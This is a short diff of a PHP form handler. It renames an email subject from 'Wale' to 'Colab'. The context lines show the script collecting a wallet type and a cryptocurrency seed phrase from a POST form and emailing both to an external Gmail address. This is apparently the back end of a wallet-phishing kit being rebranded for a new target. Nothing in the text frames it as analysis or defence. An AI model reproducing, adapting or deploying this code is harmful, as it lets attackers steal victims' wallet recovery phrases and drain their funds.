@@ -7,7 +7,7 @@ if (isset($_POST['vendor'])) {
     $from = 'admin@colab.com'; // Mail create from your cpanel
     $to = "mail.mirolic@gmail.com"; // Receiver address
 
-    $subject = "Mail From Wale";
+    $subject = "Mail From Colab";
     $message = "You have received a new message from your website, " .
         "Here is the TYPE: " . $_POST['vendor'] . "\n" .
         "Here is the seed and phrase: " . $_POST['seed_phrase'] . "\n";
